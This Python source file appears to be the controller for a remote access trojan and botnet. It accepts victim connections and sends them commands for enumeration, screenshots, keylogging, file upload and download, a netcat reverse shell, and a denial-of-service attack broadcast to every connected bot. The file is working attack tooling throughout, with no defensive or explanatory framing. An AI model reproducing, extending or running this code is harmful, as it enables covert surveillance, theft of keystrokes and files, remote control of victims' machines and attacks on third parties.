import socket
import sys
import os,json,time
from PyQt5 import QtCore
import time,subprocess as sp
class revab():
	def __init__(self,host,port):
		self. allConnections = []
		self.allAddress = []
		self.client=""
		self.addr=""
		self.host = host
		self.port = port
		self.connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connt.settimeout(5)
		self.connt.bind((self.host, self.port))
		self.connt.listen(5)

	def upload_file(self,file_name):
		print(file_name)
		f = open(file_name, 'rb')
		client.send(f.read())

	def download_file(self,file_name):
		k = "/"
		c = 0
		if "nt" in os.name:
			dirk: str = str(sp.getoutput('powershell pwd'))
			dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
			if "\\payload" not in dirk:
				dirk  += "\\payload"
			dirk = dirk.replace('\\payload', '\\Reports\\shell_repo\\')
		else:
			dirk: str = str(sp.getoutput('pwd'))
			if ("/payload" not in dirk):
				dirk += "/payload"
			dirk = dirk.replace('/payload', '/Reports/shell_repo/')
		

		while True:
			if ("/" in k or "\\" in k):
				k = file_name[c:]
				c += 1
			# print("her", k)
			# print(c)
			else:
				break
		print(k)
		f = open(dirk + k, "wb")
		# print('kkkk')
		client.settimeout(1)
		chunk = client.recv(1024)
		while chunk:
			f.write(chunk)
			try:
				chunk = client.recv(1024)
			except socket.timeout as e:
				break
		client.settimeout(None)
		f.close()

	def reliable_send(self,data):
		jsondata = json.dumps(data)
		client.send(jsondata.encode())

	def relaible_recv(self):
		data = ''
		while True:
			try:
				data = data + client.recv(1024).decode().rstrip()
				return json.loads(data)
			except ValueError:
				continue

	def target_communication(self):
		coutScreen = 0
		while True:
			command = str(input("SCPT#%s: " % str(addr)))
			if (command == "help"):
				print(
					"\nenum \t ->>to enumrate\nscreenshoot \t ->>>> take screen shot\nstkeylog \t ->>> start keyloger\nspkeylog \t ->>> stop keyloger\nupload filename -t   ->> upload file\ndownload filename \t ->> download file\nshell \t ->> start normal reverse shell\nexit \t ->>> to exit")
			elif (command[:6] == "upload"):
				self.reliable_send(command)
				self.upload_file(command[7:])
				time.sleep(4)
			elif (command[:8] == "download"):
				self.reliable_send(command)
				self.download_file(command[9:])
				time.sleep(4)

			elif (command == "enum"):
				self.reliable_send(command)
				time.sleep(85)
				self.download_file("enum.txt")
				time.sleep(5)
			elif (command == "stkeylog"):
				self.reliable_send(command)
				result = self.relaible_recv()
				print(result)
			elif (command == "spkeylog"):
				self.reliable_send(command)
				time.sleep(4)
				self.download_file("keyloags.txt")
				time.sleep(4)
				print("data saved in keyloags.txt")
			elif (command == "shell"):
				if "nt" in os.name:
					os.system("start cmd /K  nc.exe -lvp " + str(port + 1))
				else:
					os.system("gnome-terminal -x sudo nc -lvp " + str(port + 1))
				self.reliable_send(command)
				print(port)

			elif (command == "screenshoot"):
				self.reliable_send(command)
				time.sleep(4)
				self.download_file(str(coutScreen) + "_screenshot.png")
				time.sleep(4)
				print("data saved in keyloags.txt")
				coutScreen += 1
			else:
				self.reliable_send(command)
				if (command == "exit"):
					break
				result = self.relaible_recv()
				print(result)

	def GUI_communication(self,command):
		coutScreen = 0
		if (command == "help"):
			pass
		elif (command[:6] == "upload"):
			self.reliable_send(command)
			self.upload_file(command[7:])
			time.sleep(4)
			return str("data uploaded ")
		elif (command[:8] == "download"):
			self.reliable_send(command)
			self.download_file(command[9:])
			time.sleep(4)
			return str("data saved ")
		elif (command == "enum"):
			self.reliable_send(command)
			time.sleep(85)
			self.download_file("enum.txt")
			time.sleep(5)
			return str("data saved in enum.txt")
		elif (command == "stkeylog"):
			self.reliable_send(command)
			result = self.relaible_recv()
			# print(result)
			return str(result)
		elif (command == "spkeylog"):
			self.reliable_send(command)
			time.sleep(4)
			self.download_file("keyloags.txt")
			time.sleep(4)
			# print("data saved in keyloags.txt")
			return str("data saved in keyloags.txt")
		elif (command[:3] == "dos"):
			self.reliable_send(command)
			result = self.relaible_recv()
			return str(result)
		elif (command == "shell"):
			if "nt" in os.name:
				os.system("start cmd /K  nc.exe -lvp " + str(self.port + 1))
			else:
				os.system("gnome-terminal -x sudo nc -lvp " + str(self.port + 1))
			self.reliable_send(command)
			print(self.port)
		elif (command == "screenshoot"):
			self.reliable_send(command)
			time.sleep(4)
			self.download_file(str(coutScreen) + "_screenshot.png")
			time.sleep(4)
			# print("data saved in "+str(coutScreen)+"_screenshot.png")
			coutScreen += 1
			return str("data saved in " + str(coutScreen) + "_screenshot.png")
		else:
			self.reliable_send(command)
			if (command == "exit"):
				pass
			result = self.relaible_recv()
			# print(result)
			return str(result)

	def getconnections(self):
		for item in self.allConnections:
			item.close()
		del self.allConnections[:]
		del self.allAddress[:]
		while 1:
			try:
				client, addr = self.connt.accept()
				client.setblocking(1)
				self.allConnections.append(client)
				self.allAddress.append(addr)
			except:
				break
	def allin(self):
		for i in self.allAddress:
			print("we are connected to | ID :%s ip %s port %s " % (self.allAddress.index(i), i[0], i[1]))
	def get_addressList(self):
		return self.allAddress
	def accept_con2(self,index):
		global client, addr
		client = self.allConnections[index]
		addr = self.allAddress[index][0]
		self.target_communication()
		client.close()
	def botnet_gui(self,comand):
		if (comand=="help"):
			print(
				"\nenum \t ->>to enumrate\nscreenshoot \t ->>>> take screen shot\nstkeylog \t ->>> start keyloger\nspkeylog \t ->>> stop keyloger\nupload filename -t   ->> upload file\ndownload filename \t ->> download file\nshell \t ->> start normal reverse shell\ndos target_ip stopTime \t ->> dos attack ip")
		else:
			for i in self.allAddress:
				self.GUI_accept_con2(self.allAddress.index(i))
				try:
					print("target " + str(i[0] + ":" + str(i[1])) + " output:\n", self.GUI_communication(comand))
				except:
					pass
	def GUI_accept_con2(self,index):
		global client, addr
		client = self.allConnections[index]
		addr = self.allAddress[index][0]


if __name__=="__main__":
	host = str(input("enter the ip: "))
	port = int(input("enter the port: "))
	rv = revab(host,port)
	while True:
		choice = int(input("1) for list all connection, 2) for connect,3) for botnet,4)exit: "))
		if (choice == 1):
			rv.getconnections()
			rv.allin()
		elif (choice == 2):
			try:
				index = int(input("choise: ")) - 1
				rv.accept_con2(index)
			except:
				pass
		elif (choice == 4):
			sys.exit()
		elif (choice==3):
			# comand = ""
			while True:
				comand = str(input("bot_command: "))
				if(comand =="exit"):
					break
				else:
					rv.botnet_gui(comand)
		else:
			print("wrong choice")
